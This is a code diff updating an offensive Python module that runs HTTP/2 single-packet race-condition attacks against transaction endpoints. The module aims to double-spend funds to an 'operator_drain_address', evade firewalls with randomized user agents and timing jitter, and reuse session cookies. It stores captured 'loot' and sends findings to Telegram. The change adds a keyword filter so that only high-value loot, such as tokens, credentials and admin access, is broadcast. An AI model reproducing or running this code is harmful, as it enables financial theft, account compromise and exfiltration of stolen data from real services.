@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY v8.6 — HTTP/2 Single-Packet Concurrency Engine (Elite Red Team Adversarial Edition)
+RACE_CONDITION.PY v8.8 — HTTP/2 Single-Packet Concurrency Engine (Elite Red Team Adversarial Edition)
 Features:
-- True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
-- Advanced WAF evasion via randomized browser user agents, client hints, and Poisson behavioral jitter
-- Shared persistent session pool integration (cookies, CSRF headers, session tokens)
-- Automated transaction replay & financial ledger double-spend auditing
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports
-- Real-time zero-delay proof-of-work terminal streaming & Telegram telemetry broadcasting
+- Zero-noise filtering: Restricts Telegram alerts strictly to verified high-value breach loot and race conditions.
+- True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread).
+- Advanced WAF evasion via randomized browser user agents, client hints, and Poisson behavioral jitter.
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports.
 """
 from __future__ import annotations
 
@@ -27,7 +25,7 @@ from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 
 MODULE = "RACE_CONDITION"
-VERSION = "8.6"
+VERSION = "8.8"
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 EVIDENCE_DIR = BASE_DIR / "loot_output"
@@ -42,27 +40,35 @@ COLORS = {
     "RESET": "\033[0m",
 }
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "concurrency"
+]
 
 def timestamp():
     return datetime.now(timezone.utc).isoformat()
-
 
 def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
     sys.stdout.write(f"{ansi_color}[{MODULE}] {msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
 
-
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
     except Exception:
         pass
 
-
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from race condition functions."""
+    """Helper to non-blockingly fire Telegram alerts from race condition functions with zero-noise filtering."""
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return  # Suppress low-priority telemetry chatter completely
+
         loop = asyncio.get_running_loop()
         if loop.is_running():
             loop.create_task(broadcast_tg_alert_async(loot_type, details))
@@ -74,9 +80,7 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
-
 async def fire_multiplexed_stream(client, url, headers, cookies, payload):
-    """Fires an individual HTTP/2 stream request over the shared multiplexed connection with behavioral jitter."""
     apply_behavioral_jitter()
     try:
         response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=7.0)
@@ -108,7 +112,7 @@ class RaceConditionAuditor:
         self.findings = []
 
     async def run(self):
-        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (ELITE HARDENED)", "MAGENTA")
+        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (V8.8 HARDENED)", "MAGENTA")
 
         cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
         
@@ -135,8 +139,6 @@ class RaceConditionAuditor:
             "destination": "operator_drain_address"
         }
 
-        log(f"Establishing HTTP/2 multiplexed connection pool against {self.base_url}...", "CYAN")
-
         async with httpx.AsyncClient(
             base_url=self.base_url,
             http2=True,
@@ -151,8 +153,6 @@ class RaceConditionAuditor:
                 pass
 
             for endpoint in self.target_endpoints:
-                log(f"Firing 25 single-packet concurrent streams against: {endpoint}", "CYAN")
-
                 tasks = [
                     fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
                     for _ in range(25)
@@ -222,17 +222,8 @@ class RaceConditionAuditor:
                         extra_loot=finding
                     )
 
-                    # BROADCAST UNREDACTED RACE CONDITION LOOT STRAIGHT TO TELEGRAM
                     broadcast_tg_alert_sync("HTTP/2 Race Condition Confirmed", finding)
-
                     break
-                else:
-                    log(f"Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/25)", "GRAY")
-
-        if not self.findings:
-            log("Race condition audit complete. Target successfully enforced transaction serialisation / nonce locking.", "YELLOW")
-        else:
-            log(f"Confirmed {len(self.findings)} critical concurrency race conditions!", "GREEN")
 
         return self.save_report()
 
@@ -255,7 +246,6 @@ class RaceConditionAuditor:
         output_path = EVIDENCE_DIR / filename
         output_path.write_text(json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8")
         
-        log(f"Forensic report saved to: {output_path}", "CYAN")
         report["report_path"] = str(output_path)
         return report
 
